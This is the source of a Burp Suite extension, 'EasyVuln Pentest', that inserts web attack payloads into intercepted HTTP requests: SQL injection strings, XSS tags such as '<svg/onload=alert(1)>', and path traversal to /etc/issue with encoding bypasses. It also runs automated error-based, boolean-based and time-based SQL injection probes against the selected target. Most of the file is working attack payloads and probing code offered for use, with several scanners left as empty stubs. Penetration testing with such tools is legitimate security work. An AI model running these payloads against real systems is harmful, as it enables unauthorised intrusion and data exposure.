# -*- coding: utf-8 -*-
# @Date    : 2021-06-19 11:27:56
# @Author  : donot (donot@donot.me) By T00ls.Net
# @Link    : https://blog.donot.me
# @Version : 1.0

from burp import IBurpExtender, IContextMenuFactory, IHttpRequestResponse, IScanIssue
from java.io import PrintWriter, ByteArrayOutputStream
from java.util import ArrayList, Arrays
from javax.swing import JMenuItem, JMenu
from java.awt import Toolkit
from java.awt.datatransfer import StringSelection
from javax.swing import JOptionPane
import subprocess
import tempfile
import threading
import time
import difflib
import re

class BurpExtender(IBurpExtender, IContextMenuFactory, IHttpRequestResponse):
    ErrorBasedSQLResFeatures = [
        'Microsoft OLE DB Provider for ODBC Drivers',
        'Error Executing Database Query',            
        'Microsoft OLE DB Provider for SQL Server',
        'ODBC Microsoft Access Driver',
        'ODBC SQL Server Driver',
        'supplied argument is not a valid MySQL result',
        'You have an error in your SQL syntax',
        'Incorrect column name',
        'Syntax error or access violation:',
        'Invalid column name',
        'Must declare the scalar variable',
        'Unknown system variable',
        'unrecognized token: ',
        'undefined alias:',
        'Can\'t find record in',
        '2147217900',
        'Unknown table',
        'Incorrect column specifier for column',
        'Column count doesn\'t match value count at row',
        'Unclosed quotation mark before the character string',
        'Unclosed quotation mark',
        'Call to a member function row_array() on a non-object in',
        'Invalid SQL:',
        'ERROR: parser: parse error at or near',
        '): encountered SQLException [',
        'Unexpected end of command in statement [',
        '[ODBC Informix driver][Informix]',
        '[Microsoft][ODBC Microsoft Access 97 Driver]',
        'Incorrect syntax near ',
        '[SQL Server Driver][SQL Server]Line 1: Incorrect syntax near',
        'SQL command not properly ended',
        'unexpected end of SQL command',
        'Supplied argument is not a valid PostgreSQL result',
        'internal error [IBM][CLI Driver][DB2/6000]',
        'PostgreSQL query failed',    
        'Supplied argument is not a valid PostgreSQL result',
        'pg_fetch_row() expects parameter 1 to be resource, boolean given in',
        'unterminated quoted string at or near',
        'unterminated quoted identifier at or near',
        'syntax error at end of input',
        'Syntax error in string in query expression',
        'Error: 221 Invalid formula',
        'java.sql.SQLSyntaxErrorException',
        'SQLite3::query(): Unable to prepare statement:',
        '<title>Conversion failed when converting the varchar value \'A\' to data type int.</title>',
        'SQLSTATE=42603',
        'org.hibernate.exception.SQLGrammarException:',
        'org.hibernate.QueryException',
        'System.Data.SqlClient.SqlException:',  
        'SqlException',
        'SQLite3::SQLException:',
        'Syntax error or access violation:',
        'Unclosed quotation mark after the character string',
        'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near',
        'PDOStatement::execute(): SQLSTATE[42601]: Syntax error:',
        '<b>SQL error: </b> no such column'
    ]

    def registerExtenderCallbacks(self, callbacks):
        callbacks.setExtensionName("EasyVuln Pentest")

        self.stdout = PrintWriter(callbacks.getStdout(), True)
        self.stderr = PrintWriter(callbacks.getStderr(), True)

        self.helpers = callbacks.getHelpers()
        self.callbacks = callbacks
        callbacks.registerContextMenuFactory(self)

    # Implement IContextMenuFactory
    def createMenuItems(self, invocation):
        self.context = invocation # IContextMenuInvocation
        menus = []
        mainMenu = JMenu("Insert Payload")
        mainMenu.add(JMenuItem("' and '1'='1", actionPerformed=self.insertPayloadActionPerformed))
        mainMenu.add(JMenuItem("'+and+'1'='1", actionPerformed=self.insertPayloadActionPerformed))
        mainMenu.add(JMenuItem("\" and \"1", actionPerformed=self.insertPayloadActionPerformed))
        mainMenu.add(JMenuItem("\"+and+\"1", actionPerformed=self.insertPayloadActionPerformed))
        mainMenu.add(JMenuItem("'%23", actionPerformed=self.insertPayloadActionPerformed))
        mainMenu.add(JMenuItem("'--+-", actionPerformed=self.insertPayloadActionPerformed))
        mainMenu.add(JMenuItem("' and sleep(3)--+-", actionPerformed=self.insertPayloadActionPerformed))
        mainMenu.add(JMenuItem("updatexml(0x3a,concat(1,(select user())),1)", actionPerformed=self.insertPayloadActionPerformed))
        mainMenu.add(JMenuItem("'\"></textarea><img>", actionPerformed=self.insertPayloadActionPerformed))
        mainMenu.add(JMenuItem("'\"></textarea><script>alert(1)</script>", actionPerformed=self.insertPayloadActionPerformed))
        mainMenu.add(JMenuItem("</script><img/src=x>", actionPerformed=self.insertPayloadActionPerformed))
        mainMenu.add(JMenuItem("<svg/onload=alert(1)>", actionPerformed=self.insertPayloadActionPerformed))
        mainMenu.add(JMenuItem("https://baidu.com", actionPerformed=self.insertPayloadActionPerformed))
        mainMenu.add(JMenuItem("file:///etc/issue", actionPerformed=self.insertPayloadActionPerformed))
        mainMenu.add(JMenuItem("../../../../../../etc/issue", actionPerformed=self.insertPayloadActionPerformed))
        mainMenu.add(JMenuItem("....//....//....//....//....//....//etc/issue", actionPerformed=self.insertPayloadActionPerformed))
        mainMenu.add(JMenuItem("..%252f..%252f..%252f..%252f..%252f..%252fetc/issue", actionPerformed=self.insertPayloadActionPerformed))
        mainMenu.add(JMenuItem("../../../etc/issue%00.jpg", actionPerformed=self.insertPayloadActionPerformed))
        menus.append(mainMenu)

        mainScanMenu = JMenu("Scan Vuln")
        mainScanMenu.add(JMenuItem("SQL Inject Scan", actionPerformed=self.SqliScan))
        mainScanMenu.add(JMenuItem("RCE Inject Scan", actionPerformed=self.RceScan))
        mainScanMenu.add(JMenuItem("SSRF Inject Scan", actionPerformed=self.SsrfScan))
        mainScanMenu.add(JMenuItem("PowerOver Inject Scan", actionPerformed=self.OverpowerScan))
        menus.append(mainScanMenu)
        return menus

    def insertPayloadActionPerformed(self, event):
        try:
            payload = event.getActionCommand()
            bounds = self.context.getSelectionBounds()
            message = self.context.getSelectedMessages()[0].getRequest() # bytes[]
            newMessage = message[:bounds[0]]
            newMessage = newMessage + self.helpers.stringToBytes(payload)
            newMessage = newMessage + message[bounds[1]:]
            self.context.getSelectedMessages()[0].setRequest(newMessage)
        except Exception as e:
            self.stderr.println(e)
            raise e

    def updatePayloadActionPerformed(self, event):
        try:
            payload = event.getActionCommand()
            bounds = self.context.getSelectionBounds()
            message = self.context.getSelectedMessages()[0].getRequest() # bytes[]

            data = self.helpers.bytesToString(message[bounds[0]:bounds[1]])
            # self.stdout(data)
            newMessage = message[:bounds[0]]
            newMessage = newMessage + self.helpers.stringToBytes(payload)
            newMessage = newMessage + message[bounds[1]:]
            self.context.getSelectedMessages()[0].setRequest(newMessage)
        except Exception as e:
            self.stderr.println(e)
            raise e

    def SqliScan(self, event):
        try:
            bounds = self.context.getSelectionBounds()
            message = self.context.getSelectedMessages()[0].getRequest()
            t = threading.Thread(target=self.scanErrorBasedSqlInject, args=(message, bounds))
            t.start()
        except Exception as e:
            self.stderr.println(e)
            raise e

    def RceScan(self, event):
        pass

    def SsrfScan(self, event):
        pass

    def OverpowerScan(self, event):
        pass

    def scanErrorBasedSqlInject(self, message, bounds):
        try:
            payloads = ["'\"\\()"]
            for payload in payloads:
                newMessage = message[:bounds[0]] + self.helpers.stringToBytes(payload) + message[bounds[1]:]
                data = self.helpers.bytesToString(newMessage)
                # self.stdout.println(data)
                # iHttpRequestResponse = self.context.getSelectedMessages()[0] # https://portswigger.net/burp/extender/api/burp/IHttpRequestResponse.html
                iHttpService = self.context.getSelectedMessages()[0].getHttpService() # https://portswigger.net/burp/extender/api/burp/IHttpService.html
                newHttpRequestResponse = self.callbacks.makeHttpRequest(iHttpService, newMessage)
                responseBody = self.helpers.bytesToString(newHttpRequestResponse.getResponse())
                for ErrorBasedSQLResFeature in self.ErrorBasedSQLResFeatures:
                    if ErrorBasedSQLResFeature in responseBody:
                        issue = MyScanIssue([newHttpRequestResponse], iHttpService, 'ErrorBasedSQlinjectScan',self.helpers.analyzeRequest(newHttpRequestResponse).getUrl(), "Certain", "ErrorBasedSQlinject", "High")
                        self.stdout.println(issue.getUrl())
                        self.callbacks.addScanIssue(issue)
                        return
            self.scanBooleanBasedSqlInject(message, bounds)
        # self.callbacks.makeHttpRequest(iHttpService.getHost(), iHttpService.getPort(), iHttpService.getProtocol(), newMessage)
        except Exception as e:
            self.stderr.println(e)
            raise e

    def scanBooleanBasedSqlInject(self, message, bounds):
        responseTime = []
        try:
            payloads = [
                ("+and+1%23--+-", "+and+0%23--+-"),
                ("+%26%26+1%23--+-", "+%26%26+0%23--+-"),
                ("+and+1", "+and+0"),
                ("'+and+'1'='1", "'+and+'1'='2"),
                ("'+%26%26+'1'='1", "'+%26%26+'1'='2"),
                ("\"+and+\"1\"=\"1", "\"+and+\"1\"=\"2"),
                ("\"+%26%26+\"1\"=\"1", "\"+%26%26+\"1\"=\"2"),
                ("'+and+'1'='1'%23--+-", "'+and+'1'='2'%23--+-"),
                ("'+%26%26+'1'='1'%23--+-", "'+%26%26+'1'='2'%23--+-"),
                ("\"+and+\"1\"=\"1\"%23--+-", "\"+and+\"1\"=\"2\"--+-")
            ]
            iHttpService = self.context.getSelectedMessages()[0].getHttpService()
            newMessage_rubbish = message[:bounds[0]] + self.helpers.stringToBytes('124578451245') + message[bounds[1]:]

            time_start = time.time()
            newHttpRequestResponse_raw = self.callbacks.makeHttpRequest(iHttpService, message)
            time_raw = time.time() - time_start
            newHttpRequestResponse_rubbish = self.callbacks.makeHttpRequest(iHttpService, newMessage_rubbish)
            time_rubbish = time.time() - time_start - time_raw

            responseTime = responseTime + [time_raw, time_rubbish]

            responseBody_raw = self.helpers.bytesToString(newHttpRequestResponse_raw.getResponse())
            responseBody_rubbish = self.helpers.bytesToString(newHttpRequestResponse_rubbish.getResponse())

            pat = re.compile('<[^>]+>', re.S)
            responseBody_raw_delete_html = pat.sub('', responseBody_raw).strip()
            responseBody_rubbish_delete_html = pat.sub('', responseBody_rubbish).strip()

            for payload in payloads:
                payload_true, payload_false = payload
                newMessage_true = message[:bounds[0]] + self.helpers.stringToBytes(payload_true) + message[bounds[1]:]
                newMessage_false = message[:bounds[0]] + self.helpers.stringToBytes(payload_false) + message[bounds[1]:]
                
                # data = self.helpers.bytesToString(newMessage)
                # self.stdout.println(data)
                # iHttpRequestResponse = self.context.getSelectedMessages()[0] # https://portswigger.net/burp/extender/api/burp/IHttpRequestResponse.html
                 # https://portswigger.net/burp/extender/api/burp/IHttpService.html
                time_start = time.time()
                newHttpRequestResponse_true = self.callbacks.makeHttpRequest(iHttpService, newMessage_true)
                time_true = time.time() - time_start
                newHttpRequestResponse_false = self.callbacks.makeHttpRequest(iHttpService, newMessage_false)
                time_false = time.time() - time_start - time_true

                responseTime = responseTime + [time_true, time_false]
                
                responseBody_true = self.helpers.bytesToString(newHttpRequestResponse_true.getResponse())
                responseBody_false = self.helpers.bytesToString(newHttpRequestResponse_false.getResponse())

                responseBody_true_delete_html = pat.sub('', responseBody_true).strip()
                responseBody_false_delete_html = pat.sub('', responseBody_false).strip()


                # booleanbased check
                diff_raw_rubbish = difflib.SequenceMatcher(None, responseBody_raw_delete_html, responseBody_rubbish_delete_html)
                diff_raw_true = difflib.SequenceMatcher(None, responseBody_raw_delete_html, responseBody_true_delete_html)
                diff_true_false = difflib.SequenceMatcher(None, responseBody_true_delete_html, responseBody_false_delete_html)
                # self.stdout.println("diff_raw_rubbish: " + str(diff_raw_rubbish.ratio()))
                # self.stdout.println("diff_raw_true: " + str(diff_raw_true.ratio()))
                # self.stdout.println("diff_true_false: " + str(diff_true_false.ratio()))
                if diff_raw_true.ratio() > diff_raw_rubbish.ratio() and diff_true_false.ratio() <= diff_raw_rubbish.ratio():
                    # send issue
                    self.stdout.println("find booleanbased sql inject")
                    issue = MyScanIssue([newHttpRequestResponse_true], iHttpService, 'BooleanBasedSQlinjectScan',self.helpers.analyzeRequest(newHttpRequestResponse_true).getUrl(), "Certain", "BooleanBasedSQlinject", "High")
                    self.callbacks.addScanIssue(issue)
                    #self.stdout.println(responseTime)
                    return
                else:
                    continue
            # self.stdout.println(responseTime)
            self.scanTimeBasedSqlInject(message, bounds, responseTime)
        # self.callbacks.makeHttpRequest(iHttpService.getHost(), iHttpService.getPort(), iHttpService.getProtocol(), newMessage)
        except Exception as e:
            self.stderr.println(e)
            raise e
 
    def scanTimeBasedSqlInject(self, message, bounds, responseTime):
        delayTimeStandard = self.delayTimeCalc(responseTime)
        MIN_VALID_DELAYED_RESPONSE = 2
        # self.stdout.println("delayTimeStandard: " + str(delayTimeStandard))
        try:
            payloads = [
                "+and+sleep(2)=0",
                "+%26%26+sleep(2)=0",
                "'+and+sleep(2)=0%23--+-",
                "'+%26%26+sleep(2)=0%23--+-",
                "'+and+sleep(2)=0+and+'1",
                "'+%26%26+sleep(2)=0+and+'1",
                "\"+and+sleep(2)=0%23--+-",
                "\"+%26%26+sleep(2)=0%23--+-",
                "\"+and+sleep(2)=0+and+\"1",
                "\"+%26%26+sleep(2)=0+and+\"1"
            ]
            for payload in payloads:
                newMessage_delay = message[:bounds[0]] + self.helpers.stringToBytes(payload) + message[bounds[1]:]
                # newMessage_raw = message[:bounds[0]] + self.helpers.stringToBytes(payload_raw) + message[bounds[1]:]

                # self.stdout.println(data)
                # iHttpRequestResponse = self.context.getSelectedMessages()[0] # https://portswigger.net/burp/extender/api/burp/IHttpRequestResponse.html
                iHttpService = self.context.getSelectedMessages()[0].getHttpService() # https://portswigger.net/burp/extender/api/burp/IHttpService.html
                time_start = time.time()
                newHttpRequestResponse_delay = self.callbacks.makeHttpRequest(iHttpService, newMessage_delay)
                requestDurationTime = time.time() - time_start
                # self.stdout.println("requestDurationTime: " + str(requestDurationTime))
                if requestDurationTime > max(MIN_VALID_DELAYED_RESPONSE, delayTimeStandard):
                    time_start = time.time()
                    newHttpRequestResponse_raw = self.callbacks.makeHttpRequest(iHttpService, message)
                    requestRawTime = time.time() - time_start
                    if requestRawTime <= delayTimeStandard:
                        issue = MyScanIssue([newHttpRequestResponse_delay], iHttpService, 'TimeBasedSQlinjectScan',self.helpers.analyzeRequest(newHttpRequestResponse_delay).getUrl(), "Certain", "TimeBasedSQlinject", "High")
                        # self.stdout.println(issue.getUrl())
                        # self.stdout.println(requestDurationTime)
                        self.callbacks.addScanIssue(issue)
                        return
        # self.callbacks.makeHttpRequest(iHttpService.getHost(), iHttpService.getPort(), iHttpService.getProtocol(), newMessage)
        except Exception as e:
            self.stderr.println(e)
            raise e

    def scanSSrf(self, ihttpservice):
        pass

    def delayTimeCalc(self, responseTime):
        average_resp_time = sum(responseTime) / len(responseTime)
        _ = 0
        for i in responseTime:
            _ += (i - average_resp_time)**2
        deviation = (_ / (len(responseTime) - 1)) ** 0.5
        return average_resp_time + 7 * deviation

class MyScanIssue(IScanIssue):
    def __init__(self, httpMessages, httpService, scanname, url, confidence, name, severity):
        self._httpMessages = httpMessages
        self._httpService = httpService
        self._url = url
        self._confidence = confidence
        self._name = name
        self._severity = severity
        self._scanname = scanname
        #self.stdout = stdout
        #self.stdout.println("Init function")

    def getConfidence(self):
        return self._confidence #  "Certain", "Firm" or "Tentative".

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService

    def getIssueBackground(self):
        return "Alert By " + self._scanname

    def getIssueDetail(self):
        return "Alert By " + self._scanname

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0x00100200 # https://portswigger.net/kb/issues

    def getRemediationBackground(self):
        return "Alert By " + self._scanname

    def getRemediationDetail(self):
        return "Alert By " + self._scanname

    def getSeverity(self):
        return self._severity # "High", "Medium", "Low", "Information" or "False positive".

    def getUrl(self):
        return self._url

    def getHost(self):
        return self._httpService.getHost()

    def getPort(self):
        return self._httpService.getPort()